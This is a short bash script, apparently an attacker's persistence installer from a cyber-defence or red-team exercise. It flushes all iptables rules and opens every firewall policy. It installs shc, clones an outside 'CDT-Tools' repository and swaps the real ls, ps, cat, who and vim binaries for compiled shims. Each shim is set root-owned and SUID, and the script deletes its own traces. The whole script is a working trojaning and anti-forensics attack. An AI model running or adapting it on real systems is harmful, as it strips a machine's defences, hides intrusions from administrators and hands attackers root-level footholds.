#!/bin/bash

# Creator: Simon Buchheit
# Email:   scb5436@rit.edu

# Install packages that may not be present
# Replace 'apt' with the package manager of the target machine
apt install git vim gcc make automake sl

# Flush iptables to make sure github isn't blocked
iptables -F
iptables -t mangle -F
iptables -t nat -F
iptables -t filter -F

iptables -P OUTPUT ACCEPT
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT


# Clone a tool that will allow for 'compiled' scripts
# This will allow the SUID bit to be set and used properly
git clone https://github.com/neurobin/shc.git

# Install shc
./shc/configure
make
make install

# Delete all shc evidence
rm -r *

# Clone the repository
git clone https://github.com/shadow5229/CDT-Tools.git


# Move "healthy" binaries out of /bin
# Note: Some of these paths are OS dependent
# *** Tested on: Xubuntu 18.04
mv /bin/ls /lib/module_ls
mv /bin/ps /lib/module_ps
mv /bin/cat /lib/module_cat
mv /usr/bin/who /lib/module_who
mv /usr/bin/vim /lib/module_vim

# Use 'shc' to "compile" the scripts and place them in /bin
shc -f CDT-Tools/ls_shim/ls_new -o /bin/ls
shc -f CDT-Tools/ps_shim/ps_new -o /bin/ps
shc -f CDT-Tools/cat_shim/cat_new -o /bin/cat
shc -f CDT-Tools/who_shim/who_new -o /bin/who
shc -f CDT-Tools/vim_shim/vim_new -o /bin/vim

# Set owner to root
chown root:root /bin/ls
chown root:root /bin/ps
chown root:root /bin/cat
chown root:root /bin/who
chown root:root /bin/vim

# Set the SUID bit for root so that all commands will always run
chmod u+s /bin/ls
chmod u+s /bin/ps
chmod u+s /bin/cat
chmod u+s /bin/who
chmod u+s /bin/vim

# Cleanup the mess
rm -r CDT-Tools
